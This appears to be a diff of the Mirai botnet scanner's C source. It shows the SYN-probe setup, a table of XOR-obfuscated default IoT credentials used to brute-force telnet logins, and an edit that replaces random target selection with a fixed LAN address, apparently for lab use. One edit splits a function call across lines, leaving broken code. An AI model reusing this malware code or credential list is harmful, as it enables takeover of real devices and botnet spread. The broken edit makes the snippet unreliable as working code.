@@ -121,7 +121,8 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
+    add_auth_
+	entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
@@ -671,6 +672,7 @@ static void setup_connection(struct scanner_connection *conn)
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 }
 
+/*
 static ipv4_t get_random_ip(void)
 {
     uint32_t tmp;
@@ -701,6 +703,12 @@ static ipv4_t get_random_ip(void)
     );
 
     return INET_ADDR(o1,o2,o3,o4);
+}
+*/
+
+static ipv4_t get_random_ip(void){
+	printf("getting a random ip");
+	return INET_ADDR(192,168,0,3);
 }
 
 static int consume_iacs(struct scanner_connection *conn)
